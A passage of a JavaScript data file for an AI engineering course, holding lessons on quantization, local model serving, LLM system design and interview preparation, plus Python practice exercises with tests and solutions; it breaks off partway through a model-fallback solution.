        <p>Weights are normally stored as 16-bit numbers (2 bytes each). <b>Quantization</b> stores them in fewer bits, 8, 5 or 4, so the model needs less memory and runs faster, for a small loss in quality (more loss below 4 bits). Local tools use <b>GGUF</b> files, a single-file format for quantized models; names like <code>Q4_K_M</code> mean roughly 4-5 bits per weight. Memory needed is about <i>parameters &times; bits / 8</i> bytes plus 10-20% for the KV cache and runtime: an 8-billion-parameter model at 4 bits is about 4 GB of weights, about 4.8 GB with overhead. Always re-run your evals after changing the quantization.</p>
        <h3>Speed</h3>
        <p>When writing tokens, the model reads all its weights from memory once per token, so speed is limited by <b>memory bandwidth</b>: tokens per second is at most bandwidth &divide; model size. That 4 GB model on a laptop with 100 GB/s memory tops out around 25 tokens per second; on a GPU with 1,000 GB/s, around 250. Processing the prompt is faster per token, because it's done in parallel.</p>
        <h3>OpenAI-compatible endpoints</h3>
        <p>Most local servers copy the OpenAI chat completions API: <code>POST /v1/chat/completions</code> with a model name, a list of messages and max_tokens, returning the text in <code>choices[0].message.content</code>. In this format the system prompt is the first message, with role <code>"system"</code>. So the same app code can switch between a local model and a hosted one by changing the base URL, which is also what lets a <b>gateway</b> route between them.</p>
        <h3>When local beats cloud</h3>
        <p>Local wins when data can't leave your network, when you need to work offline or at the edge, when volume is high and steady enough that fixed hardware costs less than per-token prices, or when a small fine-tuned model is good enough for a narrow task. Cloud wins for the best quality, spiky or low volume, long contexts and images, and when nobody wants to run GPUs. Do the break-even sum before deciding.</p>`,
      example: `# Will it fit, and how fast will it be? (rough upper bounds)
params_billion = 8
for bits in [16, 8, 4]:
    weights_gb = params_billion * bits / 8
    print(bits, "bit:", weights_gb, "GB of weights,", round(weights_gb * 1.2, 1), "GB with overhead")

bandwidth_gb_s = {"laptop": 100, "workstation GPU": 1000}
size_4bit = params_billion * 4 / 8
for machine, bw in bandwidth_gb_s.items():
    print(machine, "about", round(bw / size_4bit), "tokens/s at most")
`,
      code: [{ label: "Call a local model through Ollama's OpenAI-compatible API (pip install openai)", code: `from openai import OpenAI

# Ollama must be running (ollama pull llama3.2 first). The API key is required by the SDK but ignored locally.
client = OpenAI(base_url="http://localhost:11434/v1", api_key="ollama")

response = client.chat.completions.create(
    model="llama3.2",
    max_tokens=300,
    messages=[
        {"role": "system", "content": "You are a concise interview coach."},
        {"role": "user", "content": "Explain RAG in two sentences."},
    ],
)
print(response.choices[0].message.content)
print(response.usage.prompt_tokens, response.usage.completion_tokens)` }],
      exercises: [{
        key: "best-quant", prompt: "Write best_quant(params_billion, vram_gb, overhead=0.2): try bit widths 16, 8, 5 and 4 in that order and return the first (highest quality) whose memory fits: params_billion × bits / 8 × (1 + overhead) gigabytes must be at most vram_gb. Return None if even 4-bit doesn't fit.",
        example: "best_quant(8, 24) returns 16   (19.2 GB fits)\nbest_quant(8, 8) returns 5    (6.0 GB fits, 9.6 GB at 8-bit doesn't)\nbest_quant(70, 24) returns None",
        hint: "Loop over `[16, 8, 5, 4]`, compute the memory, and return bits as soon as it fits. After the loop, return None.",
        starter: `def best_quant(params_billion, vram_gb, overhead=0.2):
    pass
`,
        tests: `assert best_quant(8, 24) == 16
assert best_quant(8, 8) == 5, f"got {best_quant(8, 8)}"
assert best_quant(8, 5) == 4
assert best_quant(70, 24) is None, "70B needs about 42 GB even at 4-bit"
assert best_quant(70, 48) == 4
assert best_quant(1, 2.4) == 16, "exactly full still fits"`,
        solution: `def best_quant(params_billion, vram_gb, overhead=0.2):
    for bits in [16, 8, 5, 4]:
        if params_billion * bits / 8 * (1 + overhead) <= vram_gb:
            return bits
    return None`,
      }, {
        key: "decode-speed", prompt: "Write max_tokens_per_sec(params_billion, bits, bandwidth_gb_s): an upper bound on generation speed, because every new token reads all the weights once. Model size in GB is params_billion × bits / 8; return bandwidth divided by that size.",
        example: "max_tokens_per_sec(8, 4, 100) returns 25.0",
        hint: "One line: `bandwidth_gb_s / (params_billion * bits / 8)`.",
        starter: `def max_tokens_per_sec(params_billion, bits, bandwidth_gb_s):
    pass
`,
        tests: `assert max_tokens_per_sec(8, 4, 100) == 25.0
assert max_tokens_per_sec(8, 16, 1000) == 62.5
assert max_tokens_per_sec(70, 4, 1000) < max_tokens_per_sec(8, 4, 1000), "bigger models are slower on the same hardware"`,
        solution: `def max_tokens_per_sec(params_billion, bits, bandwidth_gb_s):
    return bandwidth_gb_s / (params_billion * bits / 8)`,
      }, {
        key: "openai-compat", prompt: "Switch providers by converting formats. Write to_openai(model, system, messages, max_tokens) that turns an Anthropic-style request (system prompt separate) into an OpenAI-style one: {\"model\", \"max_tokens\", \"messages\"} where the system prompt, if it isn't empty, becomes the first message with role \"system\". Also write reply_text(response) that returns response[\"choices\"][0][\"message\"][\"content\"].",
        example: `to_openai("llama3.2", "Be brief.", [{"role": "user", "content": "Hi"}], 100) returns\n{"model": "llama3.2", "max_tokens": 100,\n "messages": [{"role": "system", "content": "Be brief."}, {"role": "user", "content": "Hi"}]}`,
        hint: "Build `([{\"role\": \"system\", \"content\": system}] if system else []) + messages` so the caller's list isn't changed.",
        starter: `def to_openai(model, system, messages, max_tokens):
    pass

def reply_text(response):
    pass
`,
        tests: `msgs = [{"role": "user", "content": "Hi"}]
r = to_openai("llama3.2", "Be brief.", msgs, 100)
assert r == {"model": "llama3.2", "max_tokens": 100, "messages": [{"role": "system", "content": "Be brief."}, {"role": "user", "content": "Hi"}]}, r
assert len(msgs) == 1, "don't change the caller's list"
assert to_openai("m", "", msgs, 5)["messages"] == msgs, "no empty system message"
assert reply_text({"choices": [{"message": {"role": "assistant", "content": "Hello!"}}]}) == "Hello!"`,
        solution: `def to_openai(model, system, messages, max_tokens):
    first = [{"role": "system", "content": system}] if system else []
    return {"model": model, "max_tokens": max_tokens, "messages": first + messages}

def reply_text(response):
    return response["choices"][0]["message"]["content"]`,
      }, {
        key: "break-even", prompt: "Write break_even(hardware_per_month, local_cost_per_request, api_cost_per_request): the number of requests per month above which running locally is cheaper than the API. Each request saves api - local dollars, and the savings must cover the monthly hardware cost; round up to a whole request. Return None if the API is not more expensive per request.",
        example: "break_even(600, 0.0005, 0.004) returns 171429\n(600 / 0.0035 = 171,428.6, rounded up)",
        hint: "`saving = api_cost_per_request - local_cost_per_request`; if it's 0 or less, return None; else `math.ceil(hardware_per_month / saving)`.",
        starter: `import math

def break_even(hardware_per_month, local_cost_per_request, api_cost_per_request):
    pass
`,
        tests: `assert break_even(600, 0.0005, 0.004) == 171429, break_even(600, 0.0005, 0.004)
assert break_even(100, 0, 0.01) == 10000
assert break_even(100, 0.01, 0.01) is None, "no saving per request, never breaks even"`,
        solution: `import math

def break_even(hardware_per_month, local_cost_per_request, api_cost_per_request):
    saving = api_cost_per_request - local_cost_per_request
    if saving <= 0:
        return None
    return math.ceil(hardware_per_month / saving)`,
      }, {
        key: "url-debug", debug: true, prompt: "Switching the app to a local model gives 404 errors. endpoint joins the base URL and the path, but people configure the base URL with or without a trailing slash and paths with or without a leading one, and the naive join produces \"//\" or no slash at all. Fix it so exactly one slash joins them.",
        example: `endpoint("http://localhost:11434/v1/", "/chat/completions") returns "http://localhost:11434/v1/chat/completions"`,
        hint: "Strip the slash from the end of the base (`rstrip(\"/\")`) and from the start of the path (`lstrip(\"/\")`), then join them with one \"/\".",
        starter: `def endpoint(base_url, path):
    return base_url + path
`,
        tests: `want = "http://localhost:11434/v1/chat/completions"
assert endpoint("http://localhost:11434/v1/", "/chat/completions") == want, endpoint("http://localhost:11434/v1/", "/chat/completions")
assert endpoint("http://localhost:11434/v1", "chat/completions") == want
assert endpoint("http://localhost:11434/v1", "/chat/completions") == want
assert endpoint("http://localhost:8000/v1/", "models") == "http://localhost:8000/v1/models"`,
        solution: `def endpoint(base_url, path):
    return base_url.rstrip("/") + "/" + path.lstrip("/")`,
      }],
      cards: [
        ["Roughly how much memory does a 70B model need at 4-bit?", "About 70 × 4 / 8 = 35 GB of weights, around 42 GB with KV cache and runtime overhead."],
        ["Why is local generation speed tied to memory bandwidth?", "Each new token reads all the weights once, so tokens per second can't exceed bandwidth divided by the model's size in bytes."],
        ["Why do local servers copy the OpenAI API?", "So existing code and SDKs work by changing only the base URL, which also lets a gateway route between local and hosted models."],
      ],
      videos: [IBM("5RIOQuHOihY", "What is Ollama? Running Local LLMs Made Simple"), IBM("0ujh7hfutq0", "Llama.cpp vs vLLM: Which Local LLM Engine Actually Scales?")],
    },
    {
      id: "sysdesign", title: "LLM system design interviews", short: "SD",
      why: "System design is a standard round for AI Engineer roles. It's where interviewers check judgement: when not to use an agent, how you'll measure quality, and what the design costs at scale.",
      body: `<p>An LLM system design round is a 45-60 minute conversation: "design a support assistant", "design document Q&amp;A for a law firm", "cut the cost of an app serving a million queries a day". There's no single right answer; interviewers watch how you reason. This framework keeps you on track.</p>
        <h3>A reusable framework</h3>
        <ol><li><b>Clarify (5-10 min):</b> who the users are and what task they're doing; inputs and outputs; the quality bar and how you'd measure it; scale (requests a day, peak); latency target; data sensitivity and permissions; budget. Write the numbers down.</li>
        <li><b>Simplest architecture first (10-15 min):</b> draw the path from request to response. Start with one model call or a fixed workflow, and add retrieval, tools or an agent only when the task needs them; say why.</li>
        <li><b>Deep dive the risky parts (20-30 min):</b> usually retrieval (chunking, hybrid search, reranking, permissions), prompts and structured output, tools and guardrails, and above all <b>evaluation</b>: a golden set offline, judges and user signals online.</li>
        <li><b>Trade-offs and failure modes (10-15 min):</b> quality versus cost versus latency; routing easy requests to a small model; caching; fallbacks when a provider fails; what will break, how you'll detect it, and how the system degrades gracefully.</li>
        <li><b>Wrap up:</b> summarize the design, name the top risks, and say what you'd build next.</li></ol>
        <p>Most questions are variations of four patterns: <b>RAG</b> (knowledge the model doesn't have), <b>feedback loops</b> (user signals into eval sets into improvements), <b>hallucination control</b> (grounding, citations, abstaining, verification) and <b>scale and cost</b> (caching, batching, model tiering, shorter prompts).</p>
        <h3>Back-of-envelope numbers</h3>
        <p>A day has 86,400 seconds, so 1 million requests a day is about 12 a second on average; plan for a peak 2-3 times higher. Cost per day = requests &times; tokens per request &times; price per token, with input and output priced separately and cached input much cheaper. If you self-host, replicas needed = peak load &divide; what one replica handles at your latency target, plus headroom.</p>
        <h3>Worked example: a support assistant for 1M questions a day</h3>
        <p>Clarify: customers asking about orders and policies; answers must cite policy and never invent refunds; p95 under 3 seconds to first token; account data is personal. Design: a router sends order-status questions to a tool call (a workflow, not an agent) and policy questions to RAG with permission filters; a small model handles routing and simple answers, a larger one the hard ones; refunds go to a human. Evals: 300 labelled questions, recall@5 for retrieval, a faithfulness judge calibrated on 100 labels, and a weekly sample of live traffic. Numbers: 1M &times; (2,000 input + 300 output tokens) with 70% of input cached is the cost line to optimize; caching and routing are the levers. Risks: stale policies (re-index on change), prompt injection through customer messages (no write tools without approval), provider outage (fallback model).</p>
        <h3>The customer round</h3>
        <p>A variant you'll meet: "a customer says the bot feels dumb; what do you change first?" Don't jump to a new model. Ask for examples, read traces, sort the failures into categories, pick a metric for the biggest one, make the smallest fix, and measure. That's error analysis, out loud.</p>`,
      example: `requests_per_day = 1_000_000
avg = requests_per_day / 86_400
print("average", round(avg, 1), "requests/s, peak (x3)", round(avg * 3, 1))

in_tokens, out_tokens = 2000, 300
in_price, out_price, cached_ratio, hit_rate = 3, 15, 0.1, 0.7      # $ per million tokens
input_cost = requests_per_day * in_tokens * ((1 - hit_rate) + hit_rate * cached_ratio) * in_price / 1e6
output_cost = requests_per_day * out_tokens * out_price / 1e6
print("per day: input $" + str(round(input_cost)), "+ output $" + str(round(output_cost)))
`,
      exercises: [{
        key: "qps", prompt: "Write peak_rps(requests_per_day, peak_factor): average requests per second (a day has 86,400 seconds) multiplied by the peak factor, rounded to 1 decimal place.",
        example: "peak_rps(1_000_000, 3) returns 34.7",
        hint: "`round(requests_per_day / 86_400 * peak_factor, 1)`.",
        starter: `def peak_rps(requests_per_day, peak_factor):
    pass
`,
        tests: `assert peak_rps(1_000_000, 3) == 34.7, f"got {peak_rps(1_000_000, 3)}"
assert peak_rps(86_400, 1) == 1.0
assert peak_rps(0, 3) == 0`,
        solution: `def peak_rps(requests_per_day, peak_factor):
    return round(requests_per_day / 86_400 * peak_factor, 1)`,
      }, {
        key: "daily-cost", prompt: "Write daily_cost(requests, in_tokens, out_tokens, in_price, out_price, hit_rate=0.0, cached_ratio=0.1): prices are per million tokens. A hit_rate share of each request's input is read from the prompt cache at cached_ratio times the input price; the rest is full price. Return the cost per day in dollars.",
        example: "daily_cost(1_000_000, 2000, 300, 3, 15) returns 10500.0\ndaily_cost(1_000_000, 2000, 300, 3, 15, hit_rate=0.7) returns 6720.0",
        hint: "Input cost: `requests * in_tokens * ((1 - hit_rate) + hit_rate * cached_ratio) * in_price / 1_000_000`. Output cost: `requests * out_tokens * out_price / 1_000_000`.",
        starter: `def daily_cost(requests, in_tokens, out_tokens, in_price, out_price, hit_rate=0.0, cached_ratio=0.1):
    pass
`,
        tests: `assert abs(daily_cost(1_000_000, 2000, 300, 3, 15) - 10500) < 1e-6
assert abs(daily_cost(1_000_000, 2000, 300, 3, 15, hit_rate=0.7) - 6720) < 1e-6
assert daily_cost(0, 2000, 300, 3, 15) == 0`,
        solution: `def daily_cost(requests, in_tokens, out_tokens, in_price, out_price, hit_rate=0.0, cached_ratio=0.1):
    input_cost = requests * in_tokens * ((1 - hit_rate) + hit_rate * cached_ratio) * in_price / 1_000_000
    output_cost = requests * out_tokens * out_price / 1_000_000
    return input_cost + output_cost`,
      }, {
        key: "tiering", prompt: "Model tiering sends easy requests to a small model. Write tiering(requests, small_share, small_cost, large_cost): small_share of the requests go to the small model, the rest to the large one; costs are per request. Return (total_cost, saving), where saving is how much less it costs than sending everything to the large model.",
        example: "tiering(1000, 0.7, 0.001, 0.01) returns (3.7, 6.3)   (approximately)",
        hint: "`small = requests * small_share`, the rest is `requests - small`. Saving: `requests * large_cost - total`.",
        starter: `def tiering(requests, small_share, small_cost, large_cost):
    pass
`,
        tests: `total, saving = tiering(1000, 0.7, 0.001, 0.01)
assert abs(total - 3.7) < 1e-9 and abs(saving - 6.3) < 1e-9, (total, saving)
total, saving = tiering(500, 0, 0.001, 0.02)
assert abs(total - 10) < 1e-9 and abs(saving) < 1e-9, "no routing, no saving"`,
        solution: `def tiering(requests, small_share, small_cost, large_cost):
    small = requests * small_share
    total = small * small_cost + (requests - small) * large_cost
    return total, requests * large_cost - total`,
      }, {
        key: "replicas", prompt: "Write replicas_needed(peak_rps, per_replica_rps, headroom=0.3) for a self-hosted model: each replica should run at no more than (1 - headroom) of what it can handle, so the answer is peak_rps divided by (per_replica_rps × (1 - headroom)), rounded up, and at least 1.",
        example: "replicas_needed(35, 4) returns 13   (35 / 2.8 = 12.5, rounded up)",
        hint: "`max(1, math.ceil(peak_rps / (per_replica_rps * (1 - headroom))))`.",
        starter: `import math

def replicas_needed(peak_rps, per_replica_rps, headroom=0.3):
    pass
`,
        tests: `assert replicas_needed(35, 4) == 13, f"got {replicas_needed(35, 4)}"
assert replicas_needed(10, 10, headroom=0) == 1
assert replicas_needed(0.1, 5) == 1, "always at least one replica"
assert replicas_needed(100, 10, headroom=0.5) == 20`,
        solution: `import math

def replicas_needed(peak_rps, per_replica_rps, headroom=0.3):
    return max(1, math.ceil(peak_rps / (per_replica_rps * (1 - headroom))))`,
      }, {
        key: "units-debug", debug: true, prompt: "In a mock design round, the candidate's capacity estimate came out 24 times too high: 278 requests a second for a million requests a day, so the design asked for far too many GPUs. Fix avg_rps.",
        example: "avg_rps(1_000_000) returns 11.574...\navg_rps(86_400) returns 1.0",
        hint: "How many seconds are in a day, not an hour?",
        starter: `def avg_rps(requests_per_day):
    return requests_per_day / 3600
`,
        tests: `assert abs(avg_rps(1_000_000) - 11.574) < 1e-3, f"got {avg_rps(1_000_000)}"
assert avg_rps(86_400) == 1.0`,
        solution: `def avg_rps(requests_per_day):
    return requests_per_day / 86_400`,
      }],
      cards: [
        ["The five steps of the design framework?", "Clarify requirements and numbers; simplest architecture first; deep dive the risky parts, especially evaluation; trade-offs and failure modes; wrap up with risks and next steps."],
        ["1M requests a day is about how many per second?", "About 12 on average (1,000,000 / 86,400); plan for 2-3 times that at peak."],
        ["The four recurring patterns in LLM design questions?", "RAG, feedback loops, hallucination control, and scale and cost (caching, batching, tiering)."],
      ],
    },
    {
      id: "hired", title: "AI engineering interviews: coding rounds, take-homes and deep dives", short: "Hire",
      why: "A typical loop has 3-5 rounds and only one looks like a classic algorithms interview; the rest test whether you can build, measure, debug and explain AI systems. Knowing each round's format lets you practise the right thing.",
      body: `<p>Interview loops for AI Engineer roles usually have 3-5 rounds over a few weeks. The rounds you'll meet, and how to prepare for each:</p>
        <h3>The rounds</h3>
        <ul><li><b>Recruiter screen</b> (15-30 min): your story, why this role, logistics. Have a two-minute "tell me about yourself" that ends with why this job.</li>
        <li><b>Technical screen:</b> concepts in context, for example "you have a 200-page PDF and a question: what happens between pressing enter and the answer?" Walk the pipeline: parsing, chunking, embeddings, retrieval, prompt, generation, citations, evaluation.</li>
        <li><b>Coding:</b> implementation rounds (45-90 min) that grow in levels, such as a key-value store that later needs deletes and transactions, or an LRU cache; and AI-flavoured tasks such as cosine similarity, a chunker, or fixing broken embedding code. Algorithm practice lives in the sibling DSA Prep app.</li>
        <li><b>Live debugging:</b> "this agent loops forever" or "retrieval returns the wrong documents": read the trace, form a hypothesis, test it. The debug exercises across this course are practice for this.</li>
        <li><b>Take-home</b> (2-4 hours of work over a few days, then a 45-90 minute defence): most often a RAG system, an agent, a chatbot or document extraction.</li>
        <li><b>System design</b> and the <b>customer round</b>: see <button class="link-btn inline-link" data-trgo="ai|learn|sysdesign">LLM system design interviews</button>.</li>
        <li><b>Behavioural</b> and hiring manager: STAR stories with numbers; practise in the Interview section's story bank and <button class="link-btn inline-link" data-trgo="roles|learn|behavioral">Behavioural prep</button>.</li></ul>
        <p>Some companies run one coding round with AI tools allowed and one without; practise both.</p>
        <h3>Take-homes that stand out</h3>
        <ol><li>Ask clarifying questions, then double your time estimate.</li>
        <li><b>Build the eval first</b>: 20 questions with expected sources, recall@5 and a faithfulness check. Graders call missing evaluation the biggest differentiator.</li>
        <li>Keep it simple and configurable, with basic tests and error handling.</li>
        <li>README: how to run it, the design decisions and trade-offs, eval results, cost per request, and what you'd do with more time. Add a 3-5 minute video walkthrough.</li>
        <li>Prepare the defence: it often matters more than the code. Be ready to explain every choice and the alternatives you rejected.</li></ol>
        <h3>Project deep dives</h3>
        <p>Pick one project and practise telling it in this order: the problem and users; the architecture; your hardest decision and the alternatives; how you measured it; what broke and how you found out; results with numbers; what you'd change. Say "I" for your own work.</p>
        <h3>Portfolio and resume</h3>
        <p>Three or four projects beat ten demos, each with a README that leads with the result and the eval numbers. Resume bullets follow <i>action + what you built + measured result</i> ("Raised recall@5 from 0.62 to 0.88 by adding hybrid search and reranking, measured on 30 questions"). Mirror the words real postings use; the Roles section shows them.</p>`,
      example: `# A take-home's eval report in miniature: recall@5 over three questions
results = [
    (["d3", "d1", "d9", "d4", "d2"], ["d1"]),        # (retrieved, relevant)
    (["d7", "d8", "d2", "d6", "d5"], ["d2", "d4"]),
    (["d5", "d6", "d7", "d8", "d9"], ["d1"]),
]
scores = []
for retrieved, relevant in results:
    hits = len(set(retrieved[:5]) & set(relevant))
    scores.append(hits / len(relevant))
print("recall@5 per question:", scores)
print("mean recall@5:", round(sum(scores) / len(scores), 2))
`,
      exercises: [{
        key: "kv-store", prompt: "An implementation round in three levels. Write class KVStore with: set(key, value); get(key) returning None when missing; delete(key) returning True if the key existed; begin() to start a transaction; rollback() to undo every change since the matching begin(); and commit() to keep the changes and close the transaction. Transactions can be nested; rollback() or commit() with no open transaction raises RuntimeError.",
        example: "s = KVStore(); s.set(\"a\", 1); s.begin(); s.set(\"a\", 2); s.delete(\"a\")\ns.rollback(); s.get(\"a\") returns 1",
        hint: "Level 1 is a dict. For transactions, keep a stack of saved states: begin() pushes `dict(self.data)` (a copy), rollback() pops it back into self.data, commit() just pops it. Copying is fine at interview scale; say how you'd optimize it (store only the changed keys).",
        starter: `class KVStore:
    def __init__(self):
        pass

    def set(self, key, value):
        pass

    def get(self, key):
        pass

    def delete(self, key):
        pass

    def begin(self):
        pass

    def rollback(self):
        pass

    def commit(self):
        pass
`,
        tests: `s = KVStore()
s.set("a", 1)
assert s.get("a") == 1 and s.get("zz") is None
assert s.delete("a") is True and s.delete("a") is False and s.get("a") is None
s.set("a", 1)
s.begin(); s.set("a", 2); s.set("b", 3); s.delete("a")
s.rollback()
assert s.get("a") == 1 and s.get("b") is None, "rollback undoes everything since begin"
s.begin(); s.set("a", 5); s.begin(); s.set("a", 6); s.rollback()
assert s.get("a") == 5, "the inner rollback only undoes the inner transaction"
s.commit()
assert s.get("a") == 5
for bad in [s.rollback, s.commit]:
    try:
        bad(); raise SystemExit("expected RuntimeError with no open transaction")
    except RuntimeError:
        pass`,
        solution: `class KVStore:
    def __init__(self):
        self.data = {}
        self.saved = []

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

    def delete(self, key):
        if key in self.data:
            del self.data[key]
            return True
        return False

    def begin(self):
        self.saved.append(dict(self.data))

    def rollback(self):
        if not self.saved:
            raise RuntimeError("no open transaction")
        self.data = self.saved.pop()

    def commit(self):
        if not self.saved:
            raise RuntimeError("no open transaction")
        self.saved.pop()`,
      }, {
        key: "star-check", prompt: "Check a STAR story before an interview. Write star_gaps(story): story is a dict with \"situation\", \"task\", \"action\" and \"result\" strings. Return a list of problems, in this order: \"missing SECTION\" for each section that is missing or blank; \"result has no number\" if the result contains no digit; \"action says we more than I\" if, counting whole words case-insensitively (punctuation stripped), \"we\" appears more often than \"i\" in the action.",
        example: `star_gaps({"situation": "Support bot gave wrong refund rules.", "task": "Fix it in a week.",\n           "action": "We added retrieval and we wrote evals.", "result": "Complaints fell a lot."})\nreturns ["result has no number", "action says we more than I"]`,
        hint: "Sections: loop over the four names and check `not story.get(name, \"\").strip()`. Digits: `any(ch.isdigit() for ch in result)`. Words: `[w.strip(\".,!?\").lower() for w in action.split()]`, then `.count(\"we\")` and `.count(\"i\")`.",
        starter: `def star_gaps(story):
    pass
`,
        tests: `story = {"situation": "Support bot gave wrong refund rules.", "task": "Fix it in a week.", "action": "We added retrieval and we wrote evals.", "result": "Complaints fell a lot."}
assert star_gaps(story) == ["result has no number", "action says we more than I"], star_gaps(story)
good = {"situation": "s", "task": "t", "action": "I built the eval set; we reviewed it, and I fixed retrieval.", "result": "Recall@5 rose from 0.62 to 0.88."}
assert star_gaps(good) == []
assert star_gaps({"situation": "s", "task": "  ", "action": "I did it."}) == ["missing task", "missing result", "result has no number"]`,
        solution: `def star_gaps(story):
    problems = []
    for name in ["situation", "task", "action", "result"]:
        if not story.get(name, "").strip():
            problems.append("missing " + name)
    if not any(ch.isdigit() for ch in story.get("result", "")):
        problems.append("result has no number")
    words = [w.strip(".,!?;:").lower() for w in story.get("action", "").split()]
    if words.count("we") > words.count("i"):
        problems.append("action says we more than I")
    return problems`,
      }, {
        key: "metric-debug", debug: true, prompt: "A take-home's eval script reports mean recall@k of 1.0, but the system obviously misses some questions. The script skips questions where nothing was retrieved instead of counting them as 0, which inflates the score (and it crashes if nothing was retrieved for any question). Fix mean_recall so every question counts, and return 0.0 for an empty list.",
        example: `mean_recall([(["d1"], ["d1"]), ([], ["d2"])], 5) returns 0.5, not 1.0`,
        hint: "Don't skip anything: a question with no retrieved documents has recall 0 but still counts in the average. Divide by `len(results)`.",
        starter: `def mean_recall(results, k):
    total, counted = 0.0, 0
    for retrieved, relevant in results:
        if not retrieved:
            continue
        hits = len(set(retrieved[:k]) & set(relevant))
        total = total + hits / len(relevant)
        counted = counted + 1
    return total / counted
`,
        tests: `assert mean_recall([(["d1"], ["d1"]), ([], ["d2"])], 5) == 0.5, f"got {mean_recall([(['d1'], ['d1']), ([], ['d2'])], 5)}"
assert mean_recall([([], ["d1"])], 5) == 0.0, "nothing retrieved anywhere is recall 0, not a crash"
assert mean_recall([], 5) == 0.0
assert mean_recall([(["a", "b", "c"], ["c"])], 2) == 0.0, "only the top k count"`,
        solution: `def mean_recall(results, k):
    if not results:
        return 0.0
    total = 0.0
    for retrieved, relevant in results:
        hits = len(set(retrieved[:k]) & set(relevant))
        total = total + hits / len(relevant)
    return total / len(results)`,
      }],
      cards: [
        ["What makes a take-home stand out?", "An eval built first with real numbers, a simple configurable design with tests, a README covering decisions, trade-offs, cost and next steps, a short video walkthrough, and a well-prepared defence."],
        ["The order for a project deep dive?", "Problem and users, architecture, hardest decision and alternatives, how you measured, what broke, results with numbers, what you'd change."],
        ["What does a strong resume bullet contain?", "An action verb, what you built, and a measured result, in the words postings use."],
      ],
    },
  ],
  why: {
    llmops: "Production is where cost, latency and failures show up. Teams want engineers who can put a number on each and keep them in budget, and \"design for a million queries a day\" is a classic interview prompt.",
    customization: "Teams ask \"should we fine-tune?\" constantly, and the right answer is usually \"not yet\". Knowing the ladder from prompting to RAG to fine-tuning, and what a dataset needs, makes you the person who saves them months.",
  },
  append: {
    llmops: `<h3>Guarding cost</h3>
      <p>Unbounded consumption is an OWASP risk as well as a budget one: one looping agent or abusive user can run up a large bill. Cap max_tokens and agent steps, set per-user and per-feature budgets that refuse requests once spent, rate-limit per key, and alert on spikes long before the provider's hard limit.</p>
      <h3>Gateways and fallbacks</h3>
      <p>A <b>model gateway</b> sits between your apps and every model: one API, per-team keys and budgets, routing (small model for easy requests), <b>fallbacks</b> to another model or provider on 429 and 5xx errors, caching and central logging. See <button class="link-btn inline-link" data-trgo="roles|learn|selfhost">Self-hosting &amp; serving models</button> for gateways in front of your own models.</p>
      <h3>Tracing and latency</h3>
      <p>A <b>trace</b> follows one request through every step (retrieval, each model call, each tool call) as timed <b>spans</b> with tokens and cost, so you can see where time and money went; <button class="link-btn inline-link" data-trgo="roles|learn|aiobs">Observability for AI applications</button> goes deeper. For latency, track <b>time to first token</b> separately from total time, and percentiles (p50, p95) rather than averages.</p>
      <h3>Semantic caching</h3>
      <p>A response cache keyed on exact text misses paraphrases. A <b>semantic cache</b> embeds each question and reuses a stored answer when a new question is similar enough. It cuts cost for FAQ-style traffic, but set a high threshold and never use it for personalized or time-sensitive answers.</p>`,
    customization: `<h3>LoRA in numbers</h3>
      <p>Fine-tuning a weight matrix of size d &times; k normally updates all d &times; k numbers. <b>LoRA</b> freezes it and learns two thin matrices instead, d &times; r and r &times; k, where the <b>rank</b> r is small (8-64), so only r &times; (d + k) numbers are trained: for a 4096 &times; 4096 matrix at r = 8, that's 65,536 instead of 16.8 million. <b>QLoRA</b> trains LoRA adapters on a 4-bit quantized base model, which brings fine-tuning a 7-8B model within reach of a single GPU.</p>
      <h3>Dataset engineering</h3>
      <p>Most of a fine-tune's quality comes from its data: consistent formatting, deduplication, balanced coverage of the cases that matter, personal data removed, and a test set split off <b>before</b> anything else (with a fixed random seed, so the split is reproducible). Synthetic examples generated by a stronger model (distillation) need filtering and spot-checking like any other data.</p>`,
  },
  exercises: {
    llmops: [{
      key: "budget-guard", prompt: "Write class BudgetGuard(limit) with charge(user, cost) and spent(user). charge adds cost to that user's total, unless that would take them over limit: then it raises RuntimeError and records nothing. spent returns a user's total so far (0 for a new user).",
      example: "g = BudgetGuard(1.0); g.charge(\"ada\", 0.6); g.charge(\"ada\", 0.5) raises RuntimeError\ng.spent(\"ada\") returns 0.6",
      hint: "Keep a dict in `self.totals`. In charge, compute `new = self.spent(user) + cost` first; if it's over the limit, raise before changing anything.",
      starter: `class BudgetGuard:
    def __init__(self, limit):
        pass

    def charge(self, user, cost):
        pass

    def spent(self, user):
        pass
`,
      tests: `g = BudgetGuard(1.0)
g.charge("ada", 0.6)
try:
    g.charge("ada", 0.5); raise SystemExit("expected RuntimeError: 1.1 is over the limit")
except RuntimeError:
    pass
assert g.spent("ada") == 0.6, "a refused charge records nothing"
g.charge("ada", 0.4)
assert abs(g.spent("ada") - 1.0) < 1e-9, "reaching the limit exactly is allowed"
assert g.spent("bo") == 0
g.charge("bo", 0.9)
assert g.spent("bo") == 0.9, "each user has their own budget"`,
      solution: `class BudgetGuard:
    def __init__(self, limit):
        self.limit = limit
        self.totals = {}

    def charge(self, user, cost):
        new = self.spent(user) + cost
        if new > self.limit + 1e-12:
            raise RuntimeError(user + " is over budget")
        self.totals[user] = new

    def spent(self, user):
        return self.totals.get(user, 0)`,
    }, {
      key: "fallback", prompt: "Write call_with_fallback(models, send): models is a list of model names in order of preference; send(model) returns (status, text). Return (model, text) for the first model that returns 200. On 429 or 5xx, move on to the next model. On any other status, raise ValueError at once: a bad request fails on every model. If every model fails, raise RuntimeError.",
      example: `If "large" returns 529 (overloaded) and "medium" returns 200:\ncall_with_fallback(["large", "medium", "small"], send) returns ("medium", "...")`,
      hint: "Loop over the models: `status, text = send(model)`; return on 200; `continue` on 429 or 500-599; otherwise raise ValueError. Raise RuntimeError after the loop.",
      starter: `def call_with_fallback(models, send):
    pass
`,
      tests: `def make(statuses):
    tried = []
    def send(model):
        tried.append(model)
        return statuses[model], "answer from " + model
    return send, tried
send, tried = make({"large": 529, "medium": 200, "small": 200})
assert call_with_fallback(["large", "medium", "small"], send) == ("medium", "answer from medium") and tried == ["large", "medium"]
send, tried = make({"large": 400, "medium": 200})
try:
    call_with_fallback(["large", "medium"], send); raise SystemExit("a 400 should raise ValueError")
except ValueError:
    pass
assert tried == ["large"], "don't try other models for a bad request"
send, tried = make({"large": 429, "medium": 503})
try:
    call_with_fallback(["large", "medium"], send); raise SystemExit("expected RuntimeError")
except RuntimeError:
    pass`,
      solution: `def call_with_fallback(models, send):
    for model in models:
        status, text = send(model)
        if status == 200:
            return model, text
        if status == 429 or 500 <= status <= 599:
            continue
